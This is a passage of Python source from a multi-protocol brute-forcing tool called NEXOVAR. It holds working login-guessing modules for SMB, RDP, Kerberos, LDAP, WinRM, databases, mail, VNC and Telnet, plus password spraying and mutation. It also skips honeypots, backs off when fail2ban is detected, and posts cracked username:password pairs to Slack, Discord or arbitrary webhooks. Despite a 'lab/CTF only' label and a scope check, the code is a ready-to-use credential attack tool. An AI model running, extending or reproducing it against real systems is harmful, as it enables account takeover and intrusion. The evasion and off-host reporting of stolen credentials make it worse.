        except (httpx.ConnectError, httpx.ConnectTimeout):
            return None
        except httpx.TimeoutException:
            return None
        except Exception as e:
            log.debug("http err %s %s/%s %s", url, username, password, e)
            return None
        if r.status_code == 401:
            try:
                from httpx import DigestAuth
                async with httpx.AsyncClient(verify=False,
                                             timeout=timeout) as c:
                    r2 = await c.get(url, auth=DigestAuth(username, password))
                    return r2.status_code != 401
            except Exception:
                return False
        return True


@register
class RedisProtocol(BaseProtocol):
    name = "redis"
    default_port = 6379
    requires = (("redis", "pip install redis"),)

    async def attempt(self, host, port, username, password, timeout):
        import redis.asyncio as aioredis
        try:
            client = aioredis.Redis(
                host=host, port=port, password=password or None,
                username=username or None,
                socket_connect_timeout=timeout,
                socket_timeout=timeout)
            await asyncio.wait_for(client.ping(), timeout=timeout + 2)
            await client.aclose()
            return True
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            msg = str(e).lower()
            if "auth" in msg or "wrongpass" in msg or "invalid" in msg:
                return False
            if "noauth" in msg:
                return password == ""
            return None


@register
class SMBProtocol(BaseProtocol):
    name = "smb"
    default_port = 445
    requires = (("impacket", "pip install impacket"),)

    async def attempt(self, host, port, username, password, timeout):
        from impacket.smbconnection import SMBConnection

        def _try():
            try:
                conn = SMBConnection(host, host, timeout=timeout)
                conn.login(username, password)
                conn.close()
                return True
            except Exception as e:
                msg = str(e).lower()
                if any(x in msg for x in (
                        "logon_failure", "wrong_password", "access_denied",
                        "logon failure", "password expired",
                        "status_logon_failure", "status_wrong_password",
                        "status_account_locked_out",
                        "status_password_expired",
                        "status_no_such_user")):
                    return False
                return None

        return await asyncio.get_event_loop().run_in_executor(None, _try)


@register
class WinRMProtocol(BaseProtocol):
    name = "winrm"
    default_port = 5985
    aliases = ("winrm-tls",)
    requires = (("winrm", "pip install pywinrm"),)

    async def attempt(self, host, port, username, password, timeout):
        import winrm
        scheme = "https" if port in (5986,) else "http"
        endpoint = f"{scheme}://{host}:{port}/wsman"

        def _try():
            try:
                session = winrm.Session(
                    endpoint, auth=(username, password),
                    transport="ntlm", server_cert_validation="ignore")
                session.run_cmd("whoami")
                return True
            except winrm.exceptions.InvalidCredentialsError:
                return False
            except winrm.exceptions.WinRMTransportError:
                return None
            except Exception as e:
                msg = str(e).lower()
                if "auth" in msg or "credential" in msg or "401" in msg:
                    return False
                return None

        return await asyncio.get_event_loop().run_in_executor(None, _try)


@register
class LDAPProtocol(BaseProtocol):
    name = "ldap"
    default_port = 389
    aliases = ("ldaps",)
    requires = (("ldap3", "pip install ldap3"),)

    async def attempt(self, host, port, username, password, timeout):
        from ldap3 import Server, Connection, ALL, Tls
        use_tls = port in (636,)

        candidates = [username]
        if "." in host:
            domain = host.split(".", 1)[0]
            candidates.append(f"{username}@{host}")
            dn_parts = ",".join(f"dc={p}" for p in host.split("."))
            candidates.append(f"uid={username},{dn_parts}")
            candidates.append(f"cn={username},{dn_parts}")
            candidates.append(f"{domain}\\{username}")

        def _try():
            try:
                tls = Tls(validate=ssl.CERT_NONE) if use_tls else None
                server = Server(host, port=port, use_ssl=use_tls,
                                get_info=ALL, connect_timeout=timeout,
                                tls=tls)
            except Exception as e:
                log.debug("ldap server init: %s", e)
                return None

            saw_invalid = False
            for bind_user in candidates:
                try:
                    c = Connection(server, user=bind_user,
                                   password=password,
                                   auto_bind=True,
                                   receive_timeout=timeout)
                    if c.bound:
                        c.unbind()
                        return True
                    saw_invalid = True
                except Exception as e:
                    msg = str(e).lower()
                    if ("invalid credentials" in msg or "invalidcred" in msg
                            or "49" in msg):
                        saw_invalid = True
                        continue
                    if "no such object" in msg or "invalid dn" in msg:
                        continue
                    log.debug("ldap bind err: %s", e)
                    continue
            return False if saw_invalid else None

        return await asyncio.get_event_loop().run_in_executor(None, _try)


@register
class MSSQLProtocol(BaseProtocol):
    name = "mssql"
    default_port = 1433
    aliases = ("sqlserver",)
    requires = (("pymssql", "pip install pymssql (Linux: apt install freetds-dev)"),)

    async def attempt(self, host, port, username, password, timeout):
        import pymssql

        def _try():
            try:
                conn = pymssql.connect(
                    server=host, port=str(port), user=username,
                    password=password, login_timeout=int(timeout))
                conn.close()
                return True
            except pymssql.OperationalError as e:
                msg = str(e).lower()
                if "login failed" in msg or "18456" in msg:
                    return False
                return None
            except Exception as e:
                log.debug("mssql err: %s", e)
                return None

        return await asyncio.get_event_loop().run_in_executor(None, _try)


@register
class MongoProtocol(BaseProtocol):
    name = "mongodb"
    default_port = 27017
    aliases = ("mongo",)
    requires = (("motor", "pip install motor"),)

    async def attempt(self, host, port, username, password, timeout):
        from motor.motor_asyncio import AsyncIOMotorClient
        if username or password:
            uri = (f"mongodb://{username}:{password}@{host}:{port}/"
                   f"?authSource=admin&serverSelectionTimeoutMS="
                   f"{int(timeout*1000)}")
        else:
            uri = (f"mongodb://{host}:{port}/"
                   f"?serverSelectionTimeoutMS={int(timeout*1000)}")
        try:
            client = AsyncIOMotorClient(
                uri, serverSelectionTimeoutMS=int(timeout * 1000))
            await asyncio.wait_for(client.admin.command("ping"),
                                   timeout=timeout + 2)
            client.close()
            return True
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            msg = str(e).lower()
            if ("auth" in msg or "credential" in msg
                    or "unauthor" in msg or "authentication" in msg):
                return False
            return None


@register
class ElasticsearchProtocol(BaseProtocol):
    name = "elasticsearch"
    default_port = 9200
    aliases = ("es",)
    requires = (("httpx", "pip install httpx"),)

    async def attempt(self, host, port, username, password, timeout):
        import httpx
        url = f"http://{host}:{port}/"
        auth = (username, password) if username or password else None
        try:
            async with httpx.AsyncClient(timeout=timeout) as c:
                r = await c.get(url, auth=auth)
        except Exception:
            return None
        if r.status_code == 401:
            return False
        return r.status_code < 500


@register
class VNCProtocol(BaseProtocol):
    name = "vnc"
    default_port = 5900
    requires = (("Crypto.Cipher.DES", "pip install pycryptodome"),)

    async def attempt(self, host, port, username, password, timeout):
        from Crypto.Cipher import DES
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
        except Exception:
            return None
        try:
            ver = await asyncio.wait_for(reader.read(12), timeout=timeout)
            if not ver.startswith(b"RFB "):
                return None
            writer.write(b"RFB 003.008\n")
            await writer.drain()
            n = (await asyncio.wait_for(reader.read(1), timeout=timeout))[0]
            if n == 0:
                return None
            types = await asyncio.wait_for(reader.read(n), timeout=timeout)
            if 2 not in types and 1 not in types:
                return None
            chosen = 2 if 2 in types else 1
            writer.write(bytes([chosen]))
            await writer.drain()
            if chosen == 1:
                return True
            challenge = await asyncio.wait_for(reader.read(16),
                                               timeout=timeout)
            if len(challenge) < 16:
                return None
            key = (password.encode()[:8]).ljust(8, b"\x00")
            key_bits = bytes(int(f"{b:08b}"[::-1], 2) for b in key)
            cipher = DES.new(key_bits, DES.MODE_ECB)
            response = cipher.encrypt(challenge)
            writer.write(response)
            await writer.drain()
            status = await asyncio.wait_for(reader.read(4), timeout=timeout)
            return status[:4] == b"\x00\x00\x00\x00"
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


@register
class TelnetProtocol(BaseProtocol):
    name = "telnet"
    default_port = 23
    requires = ()

    async def attempt(self, host, port, username, password, timeout):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
        except Exception:
            return None
        try:
            buf = b""
            for _ in range(20):
                try:
                    chunk = await asyncio.wait_for(reader.read(256),
                                                   timeout=timeout)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                buf += chunk
                low = buf.lower()
                if b"login" in low or b"username" in low:
                    break
            low = buf.lower()
            if b"login" not in low and b"username" not in low:
                return None
            writer.write((username + "\n").encode())
            await writer.drain()
            buf = b""
            for _ in range(10):
                try:
                    chunk = await asyncio.wait_for(reader.read(256),
                                                   timeout=timeout)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                buf += chunk
                if b"password" in buf.lower():
                    break
            writer.write((password + "\n").encode())
            await writer.drain()
            resp = b""
            for _ in range(10):
                try:
                    chunk = await asyncio.wait_for(reader.read(512),
                                                   timeout=timeout)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                resp += chunk
            low = resp.lower()
            if b"incorrect" in low or b"failed" in low or b"denied" in low:
                return False
            if (b"last login" in low or b"$" in resp or
                    b"#" in resp or b">" in resp):
                return True
            return None
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


@register
class IMAPProtocol(BaseProtocol):
    name = "imap"
    default_port = 143
    aliases = ("imaps",)
    requires = (("aioimaplib", "pip install aioimaplib"),)

    async def attempt(self, host, port, username, password, timeout):
        import aioimaplib
        use_tls = port in (993,)
        try:
            if use_tls:
                client = aioimaplib.IMAP4_SSL(host=host, port=port,
                                              timeout=timeout)
            else:
                client = aioimaplib.IMAP4(host=host, port=port,
                                          timeout=timeout)
            await asyncio.wait_for(client.wait_hello_from_server(),
                                   timeout=timeout + 2)
            await asyncio.wait_for(client.login(username, password),
                                   timeout=timeout + 2)
            await client.logout()
            return True
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            msg = str(e).lower()
            if "auth" in msg or "login" in msg or "invalid" in msg:
                return False
            return None


@register
class POP3Protocol(BaseProtocol):
    name = "pop3"
    default_port = 110
    aliases = ("pop3s",)
    requires = ()

    async def attempt(self, host, port, username, password, timeout):
        use_tls = port in (995,)
        try:
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx),
                    timeout=timeout)
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=timeout)
        except Exception:
            return None
        try:
            await asyncio.wait_for(reader.readline(), timeout=timeout)
            writer.write(f"USER {username}\r\n".encode())
            await writer.drain()
            await asyncio.wait_for(reader.readline(), timeout=timeout)
            writer.write(f"PASS {password}\r\n".encode())
            await writer.drain()
            line = await asyncio.wait_for(reader.readline(), timeout=timeout)
            return line.startswith(b"+OK")
        except asyncio.TimeoutError:
            return None
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


@register
class SMTPProtocol(BaseProtocol):
    name = "smtp"
    default_port = 25
    aliases = ("smtps", "submission")
    requires = ()

    async def attempt(self, host, port, username, password, timeout):
        use_tls = port in (465,)
        try:
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx),
                    timeout=timeout)
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=timeout)
        except Exception:
            return None

        async def cmd(line):
            writer.write((line + "\r\n").encode())
            await writer.drain()
            return await asyncio.wait_for(reader.readline(), timeout=timeout)

        try:
            await asyncio.wait_for(reader.readline(), timeout=timeout)
            await cmd("EHLO probe.local")
            r = await cmd("AUTH LOGIN")
            if not r.startswith(b"334"):
                return None
            r = await cmd(base64.b64encode(username.encode()).decode())
            if not r.startswith(b"334"):
                return False
            r = await cmd(base64.b64encode(password.encode()).decode())
            return r.startswith(b"235")
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


@register
class RDPProtocol(BaseProtocol):
    name = "rdp"
    default_port = 3389
    requires = (("impacket", "pip install impacket"),)

    async def attempt(self, host, port, username, password, timeout):
        def _try():
            try:
                import socket as _s
                with _s.create_connection((host, port), timeout=timeout) as s:
                    x224 = bytes([
                        0x03, 0x00, 0x00, 0x13,
                        0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
                    ])
                    s.sendall(x224)
                    resp = s.recv(64)
                    if not resp or resp[0] != 0x03:
                        return None
                try:
                    from impacket.examples.rdp_check import check_rdp
                except Exception:
                    return None
                try:
                    ok = check_rdp(host, username, password, domain="",
                                   port=port, timeout=timeout)
                    return bool(ok)
                except Exception:
                    return None
            except Exception:
                return None

        return await asyncio.get_event_loop().run_in_executor(None, _try)


@register
class KerberosProtocol(BaseProtocol):
    name = "kerberos"
    default_port = 88
    aliases = ("krb", "krb5")
    requires = (("impacket", "pip install impacket"),)

    async def attempt(self, host, port, username, password, timeout):
        from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants

        def _try():
            try:
                domain = host
                user = username
                if "@" in username:
                    user, domain = username.split("@", 1)
                result = getKerberosTGT(
                    Principal(user,
                              type=constants.PrincipalNameType.NT_PRINCIPAL.value),
                    password, domain, None, None, None, None)
                if isinstance(result, tuple):
                    tgt = result[0]
                else:
                    tgt = result
                return tgt is not None
            except KerberosError as e:
                code = None
                try:
                    code = e.getErrorCode()
                except Exception:
                    pass
                if code in (24, 6, 18, 12):
                    return False
                return None
            except Exception as e:
                msg = str(e).lower()
                if "pre-auth" in msg or "preauth" in msg:
                    return False
                if "client not found" in msg or "principal unknown" in msg:
                    return False
                if "kdc_has_no_such_principal" in msg:
                    return False
                log.debug("krb err: %s", e)
                return None

        return await asyncio.get_event_loop().run_in_executor(None, _try)


def tls_fingerprint(host: str, port: int, timeout: float = 3.0) -> Optional[str]:
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cipher = ssock.cipher()
                if not cipher:
                    return None
                name, proto, bits = cipher
                return f"{proto}|{name}|{bits}"
    except Exception:
        return None


async def tls_info(host: str, port: int, timeout: float = 5.0) -> dict:
    info = {"tls": False}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx,
                                    server_hostname=host),
            timeout=timeout)
        try:
            info["tls"] = True
            cert = writer.get_extra_info("peercert")
            cipher = writer.get_extra_info("cipher")
            ssl_obj = writer.get_extra_info("ssl_object")
            info["cipher"] = cipher
            info["tls_version"] = getattr(ssl_obj, "version", lambda: "")()
            if cert:
                info["cert"] = {
                    "subject": str(cert.get("subject", [])),
                    "issuer": str(cert.get("issuer", [])),
                    "notBefore": cert.get("notBefore", ""),
                    "notAfter": cert.get("notAfter", ""),
                    "subjectAltName": cert.get("subjectAltName", []),
                }
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
    except Exception:
        pass
    return info


async def send_webhook(url: str, payload: dict, timeout: float = 5.0):
    try:
        import httpx
    except ImportError:
        return
    try:
        async with httpx.AsyncClient(timeout=timeout) as c:
            await c.post(url, json=payload)
    except Exception as e:
        log.debug("webhook err: %s", e)


def slack_payload(hit: TargetResult) -> dict:
    return {"text": (f"*HIT* `{hit.host}:{hit.port}` "
                     f"({hit.protocol}) — `{hit.username}:{hit.password}`")}


def discord_payload(hit: TargetResult) -> dict:
    return {"content": (f"**HIT** `{hit.host}:{hit.port}` "
                        f"({hit.protocol}) — `{hit.username}:{hit.password}`")}


async def notify(url: str, hit: TargetResult):
    if not url:
        return
    if "hooks.slack.com" in url:
        await send_webhook(url, slack_payload(hit))
    elif "discord" in url:
        await send_webhook(url, discord_payload(hit))
    else:
        await send_webhook(url, {
            "event": "hit",
            "host": hit.host, "port": hit.port,
            "protocol": hit.protocol, "username": hit.username,
            "password": hit.password, "timestamp": hit.timestamp,
        })


async def run_target(host, port, proto_obj, users, passes, mode, org,
                     rate, host_rate, f2b, sem, stop, console, state,
                     max_attempts, timeout, counters,
                     webhook_url: Optional[str] = None,
                     attempts_log: bool = True):
    banner = await proto_obj.banner(host, port)
    log.info("Target %s:%d  protocol=%s  banner=%s",
             host, port, proto_obj.name,
             f"{C.GREY}{banner}{C.RESET}" if banner else f"{C.GREY}<none>{C.RESET}")

    if any(s in banner.lower() for s in ("cowrie", "kippo", "dionaea")):
        log.warning("Possible honeypot on %s:%d — skipping.", host, port)
        return None, 0, 0

    gen = (spray_pairs(users, passes) if mode == "spray"
           else smart_pairs(users, passes, org=org, mutate_passes=True))

    attempts = 0
    hits = 0
    errors = 0
    tasks: set[asyncio.Task] = set()
    last = "—"
    stop_local = asyncio.Event()

    async def _safe_attempt(u, pw):
        async with sem:
            if stop.is_set() or stop_local.is_set():
                return None
            try:
                ok = await proto_obj.attempt(host, port, u, pw, timeout)
            except Exception as e:
                log.debug("attempt crash %s: %s", proto_obj.name, e)
                return None
            if attempts_log:
                result = "HIT" if ok is True else (
                    "FAIL" if ok is False else "ERR")
                await state.log_attempt(host, port, proto_obj.name, u, pw,
                                        result)
            if ok is True:
                return (u, pw)
            if ok is None:
                counters["errors"] += 1
                refused = await f2b.record(host, refused=True)
                if refused:
                    counters["backoffs"] += 1
                    log.warning("Backoff on %s (15s)", host)
                    await f2b.backoff(15)
            return None

    async def pump():
        nonlocal attempts, last
        for u, p in gen:
            if stop.is_set() or stop_local.is_set():
                break
            if attempts >= max_attempts:
                break
            if counters["attempts"] >= counters["max_attempts"]:
                log.warning("Global attempt cap reached — stopping.")
                stop.set()
                break
            await rate.wait()
            await host_rate.wait(host)
            attempts += 1
            counters["attempts"] += 1
            last = f"{u or '<blank>'}:{p or '<blank>'}"
            t = asyncio.create_task(_safe_attempt(u, p))
            tasks.add(t)
            t.add_done_callback(tasks.discard)
            while len(tasks) >= sem._value + 5:
                await asyncio.sleep(0.01)
                if stop.is_set() or stop_local.is_set():
                    return

    pump_task = asyncio.create_task(pump())

    async def refresh():
        while not (stop.is_set() or stop_local.is_set()):
            console.update(
                target=f"{host}:{port}", protocol=proto_obj.name,
                attempts=attempts, hits=hits, errors=counters["errors"],
                in_flight=len(tasks), last=last)
            await asyncio.sleep(0.15)

    refresh_task = asyncio.create_task(refresh())

    hit: Optional[TargetResult] = None
    try:
        while tasks or not pump_task.done():
            if not tasks:
                await asyncio.sleep(0.02)
                continue
            done, _ = await asyncio.wait(
                tasks, return_when=asyncio.FIRST_COMPLETED)
            for d in done:
                try:
                    res = d.result()
                except Exception:
                    res = None
                if res:
                    u, p = res
                    hit = TargetResult(host, port, proto_obj.name,
                                       u, p, banner=banner)
                    hits += 1
                    stop_local.set()
                    break
            if hit:
                break
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        for t in (pump_task, refresh_task):
            t.cancel()
            try:
                await t
            except (asyncio.CancelledError, Exception):
                pass

    console.clear()

    if hit:
        footer_hit(hit.host, hit.port, hit.protocol, hit.username, hit.password)
        await state.save_hit(hit)
        if webhook_url:
            await notify(webhook_url, hit)

    await state.save_progress(host, port, proto_obj.name, last, "", attempts)
    return hit, attempts, errors


def write_markdown(state: State, path: Path):
    rows = state._conn.execute(
        "SELECT ts, host, port, protocol, username, password, banner "
        "FROM hits ORDER BY ts").fetchall()
    lines = [
        "# Lab Report",
        "",
        f"_Generated: {datetime.now().isoformat()}_",
        "",
        f"Total hits: **{len(rows)}**",
        "",
    ]
    if rows:
        lines.append("| Time | Host | Port | Proto | User | Pass | Banner |")
        lines.append("|------|------|------|-------|------|------|--------|")
        for ts, h, p, proto, u, pw, b in rows:
            lines.append(
                f"| {datetime.fromtimestamp(ts).isoformat(timespec='seconds')} "
                f"| {h} | {p} | {proto} | `{u}` | `{pw}` | {b} |")
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("\n".join(lines))
        log.info("Markdown report → %s", path)
    except Exception as e:
        log.error("Could not write markdown report: %s", e)


def write_json(state: State, path: Path):
    rows = state._conn.execute(
        "SELECT ts, host, port, protocol, username, password, banner "
        "FROM hits ORDER BY ts").fetchall()
    hits = [{
        "timestamp": ts, "iso": datetime.fromtimestamp(ts).isoformat(),
        "host": h, "port": p, "protocol": proto,
        "username": u, "password": pw, "banner": b,
    } for ts, h, p, proto, u, pw, b in rows]
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({
            "generated": datetime.now().isoformat(),
            "count": len(hits),
            "hits": hits,
        }, indent=2))
        log.info("JSON report → %s", path)
    except Exception as e:
        log.error("Could not write JSON report: %s", e)


def write_csv(state: State, path: Path):
    rows = state._conn.execute(
        "SELECT ts, host, port, protocol, username, password, banner "
        "FROM hits ORDER BY ts").fetchall()
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["timestamp", "host", "port", "protocol",
                        "username", "password", "banner"])
            for r in rows:
                w.writerow([datetime.fromtimestamp(r[0]).isoformat(), *r[1:]])
        log.info("CSV report → %s", path)
    except Exception as e:
        log.error("Could not write CSV report: %s", e)


def _write_reports(state: State, args):
    if args.report:
        p = Path(args.report)
        if p.suffix == ".json":
            write_json(state, p)
        elif p.suffix == ".csv":
            write_csv(state, p)
        else:
            write_markdown(state, p)
    if args.report_json:
        write_json(state, Path(args.report_json))
    if args.report_csv:
        write_csv(state, Path(args.report_csv))


def load_campaign(path: Path) -> dict:
    if not path.exists():
        raise FileNotFoundError(f"campaign file not found: {path}")
    text = path.read_text()
    try:
        import yaml
        return yaml.safe_load(text)
    except ImportError:
        pass
    out = {}
    for line in text.splitlines():
        line = line.split("#", 1)[0].strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip(), v.strip()
        if v.lower() in ("true", "false"):
            out[k] = v.lower() == "true"
        elif v.isdigit():
            out[k] = int(v)
        elif v.replace(".", "", 1).isdigit():
            out[k] = float(v)
        else:
            out[k] = v
    return out


async def async_main(args):
    authorized = bool(args.i_have_authorization)

    if args.campaign:
        cpath = Path(args.campaign)
        if not cpath.exists():
            log.error("Campaign file not found: %s", cpath)
            return 1
        try:
            cfg = load_campaign(cpath)
        except Exception as e:
            log.error("Failed to parse campaign file: %s", e)
            return 1
        for k, v in cfg.items():
            attr = k.replace("-", "_")
            if getattr(args, attr, None) in (None, False, [], 0):
                setattr(args, attr, v)

    try:
        scope = Scope.from_file(Path(args.scope))
    except (FileNotFoundError, ValueError) as e:
        log.error("%s", e)
        return 1

    proto_key = args.protocol.lower()
    proto_obj = PROTOCOLS.get(proto_key)
    if not proto_obj:
        for k, v in PROTOCOLS.items():
            if proto_key in getattr(v, "aliases", ()):
                proto_obj = v
                break
    if not proto_obj and proto_key not in ("all", "detect"):
        log.error("Unknown protocol '%s'. Available: %s",
                  args.protocol, ", ".join(sorted(PROTOCOLS.keys())))
        return 1

    if proto_obj and proto_obj.name in MISSING_DEPS:
        log.error("Protocol '%s' requires missing dependency: %s",
                  proto_obj.name, MISSING_DEPS[proto_obj.name])
        log.error("Install it or choose a different --protocol.")
        return 1

    default_port = args.port or (proto_obj.default_port if proto_obj else 0)

    targets: list[tuple[str, int]] = []
    for t in args.targets:
        if ":" in t and not t.count(":") > 1:
            h, p = t.rsplit(":", 1)
            try:
                targets.append((h, int(p)))
            except ValueError:
                targets.append((h, default_port))
        else:
            targets.append((t, default_port))

    for h, _ in targets:
        try:
            scope.require(h)
        except PermissionError as e:
            log.error("%s", e)
            return 2

    try:
        users = [args.username] if args.username else (
            read_lines(Path(args.userlist)) if args.userlist else [])
        passes = [args.password] if args.password else (
            read_lines(Path(args.passlist)) if args.passlist else [])
    except FileNotFoundError as e:
        log.error("Wordlist not found: %s", e)
        return 1
    if not users:
        log.error("No usernames provided. Use -u or -U.")
        return 1
    if not passes:
        log.error("No passwords provided. Use -p or -P.")
        return 1

    concurrency = min(args.concurrency, HARD_CONCURRENCY_CAP)

    if args.dry_run:
        print()
        print(panel("DRY-RUN · PLAN", [
            kv("Protocol", proto_obj.name if proto_obj else "auto/detect"),
            kv("Targets", str(len(targets))),
            kv("Users", f"{len(users)} (sample: {users[:3]})"),
            kv("Passwords", f"{len(passes)} (sample: {passes[:3]})"),
            kv("Mode", args.mode),
            kv("Session Mode",
               "REAL-WORLD" if authorized else "LAB",
               C.GREY, C.RED if authorized else C.CYAN),
            kv("Rate", f"{args.rate}/s"),
            kv("Concurrency", str(concurrency)),
            kv("Max attempts/target", str(args.max_attempts)),
            kv("Max attempts global", str(args.max_attempts_global)),
            kv("Scope file", args.scope),
            kv("Per-host rate",
               str(args.per_host_rate) if args.per_host_rate else "off"),
            kv("Webhook", "set" if args.webhook else "off"),
            kv("TLS fingerprint", "on" if args.ja3 else "off"),
        ], accent=C.YELLOW))
        print()
        return 0

    splash(protocol=proto_obj.name if proto_obj else args.protocol,
           target_count=len(targets), concurrency=concurrency,
           rate=args.rate, port=default_port, authorized=authorized)

    try:
        state = State(Path(args.state))
    except Exception as e:
        log.error("Could not open state DB '%s': %s", args.state, e)
        return 1

    console = Console(enabled=not args.quiet)
    rate = RateLimiter(args.rate)
    host_rate = HostRateLimiter(args.per_host_rate)
    f2b = Fail2BanDetector()
    sem = asyncio.Semaphore(concurrency)
    stop = asyncio.Event()

    counters = {
        "attempts": 0,
        "errors": 0,
        "backoffs": 0,
        "max_attempts": args.max_attempts_global,
    }

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set)
        except NotImplementedError:
            pass

    hits: list[TargetResult] = []
    t_start = time.monotonic()
    total_attempts = 0
    total_errors = 0

    if args.protocol == "detect":
        print()
        for host, _ in targets:
            print(panel(f"DETECT · {host}",
                        [f"{C.GREY}scanning {len(DEFAULT_SCAN_PORTS)} ports…{C.RESET}"],
                        accent=C.NEON))
            probes = await detect_target(host, DEFAULT_SCAN_PORTS,
                                         timeout=args.timeout,
                                         concurrency=concurrency)
            rows = []
            if not probes:
                rows.append(f"{C.RED}no open ports found{C.RESET}")
            for p in probes:
                proto = p.protocol or f"{C.GREY}unknown{C.RESET}"
                banner = (p.banner[:60] + "…") if len(p.banner) > 60 else p.banner
                dep_note = ""
                if p.protocol and p.protocol in MISSING_DEPS:
                    dep_note = f" {C.ORANGE}(dep missing){C.RESET}"
                rows.append(
                    f"{C.LIME}{p.port:>5}{C.RESET}  "
                    f"{C.CYAN}{proto:<14}{C.RESET}  "
                    f"{C.GREY}[{p.method}]{C.RESET}  "
                    f"{C.WHITE}{banner}{C.RESET}{dep_note}")
                if args.ja3 and p.protocol == "http" and p.port in (443, 8443):
                    fp = tls_fingerprint(host, p.port, args.timeout)
                    if fp:
                        rows.append(f"{C.GREY}          tls={fp}{C.RESET}")
            print(panel(f"RESULTS · {host}", rows, accent=C.LIME))
            print()
        state.close()
        return 0

    if args.protocol == "all":
        jobs = []
        for host, _ in targets:
            probes = await detect_target(host, DEFAULT_SCAN_PORTS,
                                         timeout=args.timeout,
                                         concurrency=concurrency)
            for p in probes:
                if not p.protocol:
                    continue
                mod = PROTOCOLS.get(p.protocol)
                if not mod:
                    continue
                if mod.name in MISSING_DEPS:
                    log.warning("Skipping %s:%d (%s) — %s",
                                host, p.port, mod.name, MISSING_DEPS[mod.name])
                    continue
                jobs.append((host, p.port, mod))
        if not jobs:
            log.error("Nothing to test — no supported services with "
                      "dependencies installed.")
            state.close()
            return 1
        results = await asyncio.gather(*(
            run_target(h, pt, mod, users, passes, args.mode, args.org,
                       rate, host_rate, f2b, sem, stop, console, state,
                       args.max_attempts, args.timeout, counters,
                       webhook_url=args.webhook,
                       attempts_log=args.log_attempts)
            for h, pt, mod in jobs), return_exceptions=True)
        for r in results:
            if isinstance(r, Exception) or r is None:
                continue
            try:
                hit, attempts, errs = r
            except (TypeError, ValueError):
                continue
            total_attempts += attempts
            total_errors += errs
            if hit:
                hits.append(hit)
        elapsed = time.monotonic() - t_start
        footer_end(hits=len(hits), attempts=total_attempts, elapsed=elapsed,
                   errors=total_errors, backoffs=counters["backoffs"])
        _write_reports(state, args)
        state.close()
        return 0

    async def one(h, p):
        log.info("Engaging %s:%d  protocol=%s  mode=%s",
                 f"{C.WHITE}{h}{C.RESET}", p,
                 proto_obj.name, args.mode.upper())
        return await run_target(h, p, proto_obj, users, passes, args.mode,
                                args.org, rate, host_rate, f2b, sem, stop,
                                console, state, args.max_attempts,
                                args.timeout, counters,
                                webhook_url=args.webhook,
                                attempts_log=args.log_attempts)

    tasks = [asyncio.create_task(one(h, p)) for h, p in targets]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for r in results:
        if isinstance(r, Exception) or r is None:
            continue
        try:
            hit, attempts, errs = r
        except (TypeError, ValueError):
            continue
        total_attempts += attempts
        total_errors += errs
        if hit:
            hits.append(hit)
            if not args.continue_after_hit:
                break

    elapsed = time.monotonic() - t_start
    footer_end(hits=len(hits), attempts=total_attempts, elapsed=elapsed,
               errors=total_errors, backoffs=counters["backoffs"])
    _write_reports(state, args)
    state.close()
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="NEXOVAR — Multi Protocol Brute-forcing Tool "
                    "(authorized lab/CTF use only).")
    p.add_argument("targets", nargs="*")
    p.add_argument("--scope", required=True)
    p.add_argument("--protocol",
                   choices=sorted(list(PROTOCOLS.keys()) + ["all", "detect"]))
    p.add_argument("--port", type=int)
    p.add_argument("-u", "--username")
    p.add_argument("-U", "--userlist")
    p.add_argument("-p", "--password")
    p.add_argument("-P", "--passlist")
    p.add_argument("--org")
    p.add_argument("--mode", choices=["brute", "spray"], default="brute")
    p.add_argument("--rate", type=float, default=DEFAULT_RATE_PER_SEC)
    p.add_argument("--per-host-rate", type=float,
                   default=DEFAULT_PER_HOST_RATE)
    p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    p.add_argument("--max-attempts", type=int,
